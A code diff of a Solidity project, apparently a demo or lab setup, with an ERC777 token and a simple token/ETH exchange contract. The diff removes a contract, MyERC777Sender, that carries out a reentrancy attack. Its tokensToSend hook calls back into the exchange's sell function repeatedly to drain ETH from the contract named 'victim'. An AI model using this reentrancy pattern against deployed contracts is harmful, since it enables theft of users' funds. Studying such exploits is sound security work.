@@ -20,24 +20,14 @@ contract MyERC777Token is ERC777 {
     ) ERC777("MyERC777Token", "MET", defaultOperators, registry){
         _mint(msg.sender, initialSupply, "", "");
     }
-
-
-
 }
 
 
 contract Exchange {
-
     MyERC777Token token;
     constructor(address _token) payable {
         token = MyERC777Token(_token);
     }
-
-
-    // function deposit() external payable  {
-    //     token._mint(msg.sender, msg.value, 0, 0); //eth to CCRT
-    // }
-
     
     function tokenToEthInput(uint256 tokensSold) public returns (uint256) {
         address buyer = msg.sender;
@@ -85,11 +75,6 @@ contract Exchange {
         return numerator / denominator;
     }
 
-    //  function getInputPrice(uint256 ethSold, uint256 ethReserve, uint256 tokenReserve) public pure returns (uint256) {
-    //     // Dummy implementation - replace this with your actual pricing logic
-    //     return ethSold * tokenReserve / ethReserve;
-    // }
-
     function getOutputPrice(uint256 outputAmount, uint256 inputReserve, uint256 outputReserve) public pure returns (uint256) {
         require(inputReserve > 0 && outputReserve > 0, "Invalid reserves");
         uint256 numerator = inputReserve * outputAmount * 1000;
@@ -100,7 +85,7 @@ contract Exchange {
     // function tokenToTokenInput(uint256 tokensSold, uint256 minTokensBought, uint256 minEthBought, uint256 deadline, address buyer, address recipient, address exchangeAddr) public returns (uint256) {
     //     require(deadline >= block.timestamp && tokensSold > 0, "Invalid deadline or tokensSold");
     //     require(minTokensBought > 0 && minEthBought > 0, "Invalid minTokensBought or minEthBought");
-    //     require(exchangeAddr != address(this) && exchangeAddr != ZERO_ADDRESS, "Invalid exchange address");
+    //     require(exchangeAddr != address(this) && exchangeAddr != address(0), "Invalid exchange address");
 
 
 
@@ -111,102 +96,11 @@ contract Exchange {
 
     //     require(token.transferFrom(buyer, address(this), tokensSold), "Token transfer failed");
 
-    //     // Call ethToTokenTransferInput on the specified exchange
-    //     uint256 tokensBought = IExchange(exchangeAddr).ethToTokenTransferInput{value: ethBought}(minTokensBought, deadline, recipient);
-
+    //     Call ethToTokenTransferInput on the specified exchange
+    //     uint256 tokensBought = Exchange(exchangeAddr).ethToTokenTransferInput{value: ethBought}(minTokensBought, deadline, recipient);
 
     //     return tokensBought;
     // }
-}
-
-contract MyERC777Sender is IERC777Sender, ERC1820Implementer {
-    IERC1820Registry private _ERC1820_REGISTRY ;
-
-    uint256 public numSend = 0;
-    address public lastReceivedFrom;
-
-    function getNum() public view returns(uint256){
-      return numSend;
-    }
-
-
-    Exchange exchange;
-
-    MyERC777Token victim ;
-
-    constructor(address registry, address _victim, address _exchange) payable{
-        _ERC1820_REGISTRY = IERC1820Registry(registry);
-        // register to ERC1820 registry
-        _ERC1820_REGISTRY.setInterfaceImplementer(
-        address(this),
-        _ERC1820_REGISTRY.interfaceHash("ERC777TokensSender"),
-        address(this)
-        );
-
-        victim = MyERC777Token(_victim);
-        exchange = Exchange(_exchange);
-
-      
-
-    }
-
-    function attack() external {
-      uint256 input_value = exchange.ethToTokenInput{value: 100 ether}();
-      require(input_value != 0, "input_value error");
-
-      bool ret = victim.approve(address(exchange), victim.balanceOf(address(this)));
-      require(ret == true, "approve failed");
-      uint256 output = exchange.tokenToEthInput(1 ether);
-    }
-
-    function tokensToSend(
-        address operator,
-        address from,
-        address to,
-        uint256 amount,
-        bytes calldata userData,
-        bytes calldata operatorData
-    ) external override {
-        numSend +=1; 
-        if(numSend < 90){
-            exchange.tokenToEthInput(1 ether);
-        }
-    }
-
-    receive() external payable {}
-}
-
-
-
-
-contract MyERC777Recipient is IERC777Recipient, ERC1820Implementer {
-  IERC1820Registry private _ERC1820_REGISTRY ;
-
-  uint256 public numTimesReceived = 0; // we can known received token info. this is feature of erc777
-  address public lastReceivedFrom;
-
-  constructor(address registry) {
-    _ERC1820_REGISTRY = IERC1820Registry(registry);
-    // register to ERC1820 registry
-    _ERC1820_REGISTRY.setInterfaceImplementer(
-      address(this),
-      _ERC1820_REGISTRY.interfaceHash("ERC777TokensRecipient"),
-      address(this)
-    );
-  }
-
-    // this function called when token is received.
-  function tokensReceived(
-    address, /* operator */
-    address from,
-    address, /* to */
-    uint256, /* amount */
-    bytes calldata, /* userData */
-    bytes calldata /* operatorData */
-  ) external override {
-    lastReceivedFrom = from;
-    numTimesReceived++;
-  }
 }
 
 
